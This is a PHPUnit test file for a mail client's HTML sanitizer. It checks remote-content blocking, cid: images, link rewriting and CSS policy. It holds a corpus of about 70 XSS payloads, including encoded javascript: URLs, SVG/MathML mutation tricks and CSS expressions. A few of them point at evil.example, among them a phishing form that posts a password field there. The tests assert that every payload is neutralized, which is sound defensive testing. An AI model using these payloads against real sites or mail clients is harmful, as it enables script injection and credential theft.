<?php

declare(strict_types=1);

namespace Fma\Tests\Unit\Mail;

use Fma\Mail\HtmlSanitizer;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * HTML mail sanitizer (roadmap 2.9): an XSS corpus whose payloads must not
 * survive, plus remote-content blocking on/off, inline cid: images, link
 * rewriting and the CSS policy. Ported from the former Node test suite.
 */
final class HtmlSanitizerTest extends TestCase
{
    private const ALLOWED_TAGS = [
        'a', 'abbr', 'address', 'article', 'aside', 'b', 'bdi', 'bdo', 'big', 'blockquote', 'br', 'caption',
        'center', 'cite', 'code', 'col', 'colgroup', 'dd', 'del', 'details', 'dfn', 'div', 'dl', 'dt', 'em',
        'figcaption', 'figure', 'font', 'footer', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header', 'hr', 'i', 'img',
        'ins', 'kbd', 'li', 'main', 'mark', 'nav', 'ol', 'p', 'pre', 'q', 's', 'samp', 'section', 'small', 'span',
        'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead',
        'time', 'tr', 'tt', 'u', 'ul', 'var', 'wbr',
    ];

    private const PNG = 'data:image/png;base64,iVBORw0KGgo=';

    private const REMOTE_MAIL = '<style>.hero { background-image: url("https://cdn.example/hero.png") }</style>'
        . '<table background="https://cdn.example/bg.png"><tr><td style="background: url(https://cdn.example/td.png)">'
        . '<img src="https://cdn.example/logo.png" alt="Logo">'
        . '<img src="http://track.example/open.gif?u=123" width="1" height="1">'
        . '<img src="//cdn.example/protocol-relative.png">'
        . '</td></tr></table>';

    /** @param array<string, string> $inlineImages */
    private static function clean(string $html, bool $allowRemote = false, array $inlineImages = []): string
    {
        return HtmlSanitizer::sanitize($html, $allowRemote, $inlineImages)['html'];
    }

    /** Structural checks every sanitized output must pass. */
    private static function assertSafe(string $html): void
    {
        // Every `<` starts an allowed (start or end) tag: text and attribute
        // values are escaped, style text carries `\3c ` instead of `<`.
        preg_match_all('/<(\/?)([^\s\/>]*)/', $html, $tags, PREG_SET_ORDER);
        foreach ($tags as $tag) {
            self::assertContains(strtolower($tag[2]), self::ALLOWED_TAGS, "tag <{$tag[1]}{$tag[2]}> in {$html}");
        }
        // Attribute names inside tags: no event handlers, no srcset/formaction etc.
        preg_match_all('/<[a-z0-9]+((?:\s+[^\s=>]+(?:="[^"]*")?)*)\s*\/?>/i', $html, $elements);
        foreach ($elements[1] as $attributes) {
            preg_match_all('/\s+([^\s=>]+)/', $attributes, $names);
            foreach ($names[1] as $name) {
                self::assertDoesNotMatchRegularExpression('/^on|^(srcset|formaction|action|xlink|srcdoc)/i', $name, $html);
            }
        }
        self::assertDoesNotMatchRegularExpression('/javascript\s*:/i', $html);
        self::assertDoesNotMatchRegularExpression('/vbscript\s*:/i', $html);
        self::assertDoesNotMatchRegularExpression('/data:text\/html/i', $html);
        self::assertDoesNotMatchRegularExpression('/data:image\/svg/i', $html);
        // Neutralized CSS is renamed to `blocked-*` (unknown -> ignored by browsers).
        self::assertDoesNotMatchRegularExpression('/(?<![\w-])expression\s*\(/i', $html);
        self::assertDoesNotMatchRegularExpression('/(?<![\w-])(-moz-binding|behavior)\s*:/i', $html);
        self::assertDoesNotMatchRegularExpression('/@import/i', $html);
    }

    /** @return iterable<string, array{string}> */
    public static function xssCorpus(): iterable
    {
        $payloads = [
            '<script>alert(1)</script>',
            '<SCRIPT SRC=http://evil.example/x.js></SCRIPT>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src=x onerror=alert(1)>',
            '<img src="x" ONERROR="alert(1)">',
            '<img/src=x/onerror=alert(1)>',
            '<body onload=alert(1)>',
            '<div onmouseover="alert(1)">x</div>',
            '<a href="javascript:alert(1)">x</a>',
            '<a href="JaVaScRiPt:alert(1)">x</a>',
            '<a href=" javascript:alert(1)">x</a>',
            "<a href=\"java\tscript:alert(1)\">x</a>",
            '<a href="java&#x09;script:alert(1)">x</a>',
            '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
            '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>',
            '<a href="jav&#x0A;ascript:alert(1)">x</a>',
            '<a href="&#0000106avascript:alert(1)">x</a>',
            '<a href="vbscript:msgbox(1)">x</a>',
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
            '<a href="javascript&colon;alert(1)">x</a>',
            '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
            '<svg onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
            '<svg><style><img src=x onerror=alert(1)></style></svg>',
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
            '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            '<object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '<form action="javascript:alert(1)"><input type=submit></form>',
            '<form action="https://evil.example/collect"><input name=pw><button>Login</button></form>',
            '<button formaction="javascript:alert(1)">x</button>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0; url=https://evil.example/">',
            '<base href="https://evil.example/">',
            '<link rel=stylesheet href="https://evil.example/x.css">',
            '<div style="width: expression(alert(1))">x</div>',
            '<div style="background:url(javascript:alert(1))">x</div>',
            '<div style="behavior: url(x.htc)">x</div>',
            '<div style="-moz-binding: url(http://evil.example/x.xml#x)">x</div>',
            '<style>@import "https://evil.example/x.css";</style>',
            '<style>@import url(https://evil.example/x.css);</style>',
            '<style>body{background:url("javascript:alert(1)")}</style>',
            '<style></style><script>alert(1)</script>',
            '<style>a{}</style ><img src=x onerror=alert(1)>',
            '<style>\3c /style\3e \3c img src=x onerror=alert(1)\3e </style>',
            '<style>/*</style><img src=x onerror=alert(1)>*/</style>',
            '<!--<img src=x onerror=alert(1)>-->',
            '<!-- --!><img src=x onerror=alert(1)> -->',
            '<!--[if gte mso 9]><script>alert(1)</script><![endif]-->',
            '<![CDATA[><img src=x onerror=alert(1)>]]>',
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
            '<title><img src=x onerror=alert(1)></title>',
            '<textarea><img src=x onerror=alert(1)></textarea>',
            '<xmp><img src=x onerror=alert(1)></xmp>',
            '<noembed><img src=x onerror=alert(1)></noembed>',
            '<template><img src=x onerror=alert(1)></template>',
            '<details open ontoggle=alert(1)>x</details>',
            '<video><source onerror=alert(1)></video>',
            '<audio src=x onerror=alert(1)>',
            '<img srcset="x 1x, javascript:alert(1) 2x">',
            '<isindex action="javascript:alert(1)">',
            '<marquee onstart=alert(1)>x</marquee>',
            '<a href="#" onclick="alert(1)">x</a>',
            '<p style="x:\65 xpression(alert(1))">x</p>',
            '<p style="background:u\72l(javascript:alert(1))">x</p>',
            '<<script>script>alert(1)<</script>/script>',
            '<img src="x` `<script>alert(1)</script>"` `>',
            '<a href="https://ok.example/"title="x"onmouseover="alert(1)">x</a>',
        ];
        foreach ($payloads as $payload) {
            yield $payload => [$payload];
        }
    }

    #[DataProvider('xssCorpus')]
    public function testNeutralizesXssPayload(string $payload): void
    {
        foreach ([false, true] as $allowRemote) {
            $html = self::clean("<p>before</p>{$payload}<p>after</p>", $allowRemote);
            self::assertSafe($html);
            self::assertDoesNotMatchRegularExpression('/<(script|iframe|object|embed|form|input|button|meta|base|link)/i', $html);
            self::assertDoesNotMatchRegularExpression('/<(svg|math|textarea|select|template|noscript|video|audio)/i', $html);
        }
    }

    public function testDropsScriptsEventHandlersAndIframesButKeepsText(): void
    {
        self::assertSame(
            '<p>Hi there</p>',
            self::clean('<p onclick="x()" onmouseover="y()">Hi <script>alert(1)</script><iframe src="https://x.example/"></iframe>there</p>'),
        );
        // Unknown tags are unwrapped, their text stays.
        self::assertSame('<p>x</p>', self::clean('<p><marquee onstart="alert(1)">x</marquee></p>'));
    }

    public function testKeepsHarmlessFormatting(): void
    {
        $html = self::clean(
            '<table width="600" cellpadding="0" bgcolor="#ffffff"><tr><td align="center" style="color: #333; font-size: 14px">'
            . '<h1>Hallo</h1><p><b>fett</b> <i>kursiv</i> <font color="red" face="Arial">rot</font></p></td></tr></table>',
        );
        self::assertStringContainsString('<table width="600" cellpadding="0" bgcolor="#ffffff">', $html);
        self::assertStringContainsString('<td align="center" style="color: #333; font-size: 14px">', $html);
        self::assertStringContainsString('<font color="red" face="Arial">rot</font>', $html);
    }

    public function testDropsDocumentShellHeadAndTitle(): void
    {
        self::assertSame(
            '<div><p>x</p></div>',
            self::clean('<!DOCTYPE html><html><head><title>Secret title</title><meta charset="utf-8"></head><body><p>x</p></body></html>'),
        );
    }

    public function testKeepsBodyColorsOnReplacementDiv(): void
    {
        self::assertSame(
            '<div style="background-color: #eeeeee; margin:0"><p>x</p></div>',
            self::clean('<body bgcolor="#eeeeee" style="margin:0"><p>x</p></body>'),
        );
    }

    public function testRejectsColorsThatAreNotPlainValues(): void
    {
        $html = self::clean('<table><tr><td bgcolor="red;background:url(https://x.example/t)">x</td></tr></table>');
        self::assertStringNotContainsString('bgcolor', $html);
        self::assertStringNotContainsString('x.example', $html);
        self::assertStringNotContainsString('color', self::clean('<font color="#fff&quot; onmouseover=&quot;x">y</font>'));
        self::assertStringNotContainsString('background-color', self::clean('<body bgcolor="red; background: url(https://x.example/t)">x</body>'));
    }

    public function testOpensHttpLinksInNewTabWithoutOpenerOrReferrer(): void
    {
        self::assertSame(
            '<a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">x</a>',
            self::clean('<a href="https://example.com/a?b=1&amp;c=2">x</a>'),
        );
    }

    public function testOverridesTargetAndRelGivenByMail(): void
    {
        $html = self::clean('<a href="https://example.com/" target="_self" rel="opener">x</a>');
        self::assertStringContainsString('target="_blank" rel="noopener noreferrer nofollow"', $html);
        self::assertStringNotContainsString('_self', $html);
        self::assertStringNotContainsString('rel="opener"', $html);
    }

    public function testKeepsMailtoAndDropsRelativeFragmentAndOtherSchemes(): void
    {
        self::assertStringContainsString('href="mailto:a@example.com"', self::clean('<a href="mailto:a@example.com">x</a>'));
        foreach (['/api/auth/session', '#top', 'ftp://x.example/', 'file:///etc/passwd', 'relative/path'] as $href) {
            self::assertStringNotContainsString('href=', self::clean("<a href=\"{$href}\">x</a>"), $href);
        }
    }

    public function testBlocksRemoteImagesBackgroundsAndCssUrlsByDefault(): void
    {
        $result = HtmlSanitizer::sanitize(self::REMOTE_MAIL, false);
        self::assertTrue($result['remoteContentBlocked']);
        self::assertDoesNotMatchRegularExpression('/https?:|\/\/cdn|track\.example/', $result['html']);
        self::assertStringContainsString('alt="Logo"', $result['html']);
        self::assertStringContainsString('background-image: none', $result['html']);
        self::assertStringContainsString('background: none', $result['html']);
    }

    public function testKeepsHttpImagesWhenRemoteContentIsAllowed(): void
    {
        $result = HtmlSanitizer::sanitize(self::REMOTE_MAIL, true);
        self::assertFalse($result['remoteContentBlocked']);
        $html = $result['html'];
        self::assertStringContainsString('<img src="https://cdn.example/logo.png" alt="Logo"', $html);
        self::assertStringContainsString('src="http://track.example/open.gif?u=123"', $html);
        self::assertStringContainsString('src="https://cdn.example/protocol-relative.png"', $html);
        self::assertStringContainsString('background="https://cdn.example/bg.png"', $html);
        self::assertStringContainsString('url("https://cdn.example/hero.png")', $html);
        self::assertStringContainsString('background: url(&quot;https://cdn.example/td.png&quot;)', $html);
        self::assertStringContainsString('referrerpolicy="no-referrer"', $html);
    }

    public function testDoesNotReportBlockingForMailsWithoutRemoteContent(): void
    {
        self::assertSame(
            ['html' => '<p>Hallo <img src="' . self::PNG . '" referrerpolicy="no-referrer" /></p>', 'remoteContentBlocked' => false],
            HtmlSanitizer::sanitize('<p>Hallo <img src="' . self::PNG . '"></p>', false),
        );
    }

    public function testNeverLoadsRelativeOrNonHttpResourcesEvenWhenAllowed(): void
    {
        $result = HtmlSanitizer::sanitize(
            '<img src="/api/messages/actions"><img src="relative.png"><img src="ftp://x.example/a.png"><img src="file:///a.png">'
            . '<div style="background: url(/api/auth/session)">x</div><table background="bg.png"><tr><td>y</td></tr></table>',
            true,
        );
        self::assertStringNotContainsString('src=', $result['html']);
        self::assertStringNotContainsString('background=', $result['html']);
        self::assertStringNotContainsString('/api/', $result['html']);
        self::assertStringContainsString('background: none', $result['html']);
        // Relative URLs are not remote content: nothing to unblock.
        self::assertFalse(HtmlSanitizer::sanitize('<img src="/a.png">', false)['remoteContentBlocked']);
    }

    public function testDropsSrcsetAlsoWhenRemoteContentIsAllowed(): void
    {
        $html = self::clean('<img src="https://a.example/1.png" srcset="https://b.example/2.png 2x">', true);
        self::assertStringNotContainsString('srcset', $html);
        self::assertStringNotContainsString('b.example', $html);
        self::assertStringContainsString('src="https://a.example/1.png"', $html);
    }

    /** @return iterable<string, array{string}> */
    public static function obfuscatedCssUrls(): iterable
    {
        foreach ([
            'background: u\72l(https://t.example/a)',
            'background: \75 \72 \6c (https://t.example/a)',
            'background: ur/**/l(https://t.example/a)',
            'background: url( "https://t.example/a" )',
            "background: URL('https://t.example/a')",
            'background: image-set("https://t.example/a" 1x)',
            'background: -webkit-image-set(url(https://t.example/a) 1x)',
            'background: \\\75 rl(https://t.example/a)',
            'background: url(https://t.example/a',
            'background: url(/**/https://t.example/a)',
        ] as $style) {
            yield $style => [$style];
        }
    }

    #[DataProvider('obfuscatedCssUrls')]
    public function testBlocksObfuscatedCssUrls(string $style): void
    {
        foreach (['<div style="' . htmlspecialchars($style, ENT_COMPAT) . '">x</div>', "<style>div { {$style} }</style>"] as $input) {
            $result = HtmlSanitizer::sanitize($input, false);
            $decoded = html_entity_decode($result['html'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
            // The URL text may survive, but only inside a neutralized function (`blocked(`, `blocked-image-set(`).
            self::assertDoesNotMatchRegularExpression('/(?<![\w-])url\s*\(\s*["\']?[^)]*t\.example/i', $decoded, $input);
            self::assertDoesNotMatchRegularExpression('/(?<![\w-])url\(\s*["\']?https?:/i', $decoded, $input);
            self::assertDoesNotMatchRegularExpression('/(?<![\w-])(-webkit-)?image-set\(/i', $decoded, $input);
            self::assertDoesNotMatchRegularExpression('/(?<!\\\)\\\7/', $decoded, $input);
        }
    }

    public function testResolvesCidReferencesToRasterDataUrlsOnly(): void
    {
        $result = HtmlSanitizer::sanitize(
            '<img src="cid:logo@example"><img src="cid:unknown@example"><img src="CID:%3Clogo@example%3E">'
            . '<div style="background: url(cid:logo@example)">x</div>',
            false,
            ['logo@example' => self::PNG],
        );
        self::assertFalse($result['remoteContentBlocked']);
        self::assertSame(2, substr_count($result['html'], '<img src="' . self::PNG . '"'));
        self::assertStringContainsString('background: url(&quot;' . self::PNG . '&quot;)', $result['html']);
        self::assertStringNotContainsString('cid:', strtolower($result['html']));
    }

    public function testRejectsNonImageAndSvgDataUrls(): void
    {
        foreach ([
            'data:text/html;base64,PHNjcmlwdD4=',
            'data:image/svg+xml;base64,PHN2Zz4=',
            'data:image/png,<script>',
            'data:image/png;base64,iVBOR"><script>',
        ] as $src) {
            self::assertStringNotContainsString('src=', self::clean('<img src="' . htmlspecialchars($src, ENT_COMPAT) . '">'), $src);
        }
        // data: URLs only on <img>, not as table backgrounds.
        self::assertStringNotContainsString('background=', self::clean('<table background="' . self::PNG . '"><tr><td>x</td></tr></table>'));
        self::assertStringNotContainsString('svg', self::clean('<div style="background: url(data:image/svg+xml;base64,PHN2Zz4=)">x</div>'));
    }

    public function testStyleTextNeverContainsLessThan(): void
    {
        // The HTML parser already ends <style> at `</style>`; a `<` inside
        // the CSS text (also as a CSS escape) is re-escaped as `\3c `.
        foreach ([
            '<style>a::after { content: "<b>" }</style>',
            '<style>a::after { content: "\3c /style\3e \3c script\3e " }</style>',
            '<style>a::after { content: "</style><script>" }</style>',
        ] as $input) {
            $html = self::clean($input);
            if (preg_match('/^<style>(.*?)<\/style>/s', $html, $m) !== 1) {
                self::fail($html);
            }
            self::assertStringNotContainsString('<', $m[1], $input);
            self::assertStringNotContainsString('<script', $html, $input);
        }
        self::assertStringContainsString('\3c b>', self::clean('<style>a::after { content: "<b>" }</style>'));
    }

    public function testKeepsOrdinaryCssRules(): void
    {
        self::assertSame(
            '<style>.a > .b { color: #333; margin: 0 auto }</style>',
            self::clean('<style>.a > .b { color: #333; margin: 0 auto }</style>'),
        );
    }

    public function testReportsBlockedRemoteCssUrls(): void
    {
        self::assertSame(
            ['html' => '<style>.a { background: none }</style>', 'remoteContentBlocked' => true],
            HtmlSanitizer::sanitize('<style>.a { background: url(https://t.example/p.gif) }</style>', false),
        );
    }
}
